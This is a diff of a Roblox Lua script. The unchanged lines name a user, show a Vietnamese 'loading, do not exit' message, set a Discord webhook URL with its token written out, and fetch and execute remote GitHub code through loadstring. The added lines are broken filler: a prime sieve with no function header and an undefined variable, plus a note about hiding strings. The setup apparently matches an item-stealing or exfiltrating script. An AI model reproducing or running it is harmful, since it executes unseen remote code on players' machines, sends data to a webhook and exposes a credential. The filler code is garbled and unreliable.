@@ -2,3 +2,25 @@ _G.Name user="omgchuakia123"
 _G.HubName = "Đang tải tập lệnh, vui lòng không thoát"
 _G.WebhookUrl = "discord.com/https://discord.com/api/webhooks/1107319474945798144/OD_Za12hB0_V29E3yHmHBgRCsbNkovHPB9fJpHZAnTYZsSnRfKQfmjA_cSfAeo7jzZ58"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+print("true")
+print("Clicking [Strings] will completely hide this string!")
+local is_prime = { }
+       for i = 1, n do
+           is_prime[i] = 1 ~= i
+       end
+       for i = 2, math.floor(math.sqrt(n)) do
+           if is_prime[i] then
+               for j = i* i, n, i do
+                   is_prime[j] = false
+               end
+           end
+       end
+       return is_prime
+   end
+   local primes = sieve_of_eratosthenes(420)
+   for key, value in pairs(primes) do
+       if (value) then
+           print("Prime found: " .. key)
+       end
+   end
+end
